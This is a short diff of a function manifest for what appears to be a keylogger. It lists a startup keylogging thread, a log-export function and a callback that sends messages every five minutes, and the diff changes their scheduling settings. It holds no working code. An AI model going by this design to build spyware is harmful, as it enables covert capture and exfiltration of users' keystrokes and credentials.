@@ -3,6 +3,6 @@ version=1.2
 interval=5
 
 Functions
-startKeylog<void, int> thread~-1 //if -1 its startup functions, starts at beggining
-exportLog<string, string> single //move log to another path
+startKeylog<void, int> startup-thread //-1 is default
+exportLog<string, string> manual-single~5 //move log to another path
 sendMessage<int, callback(will replace with exact type later)> single~5 //will send messages using callback function every 5 minutes
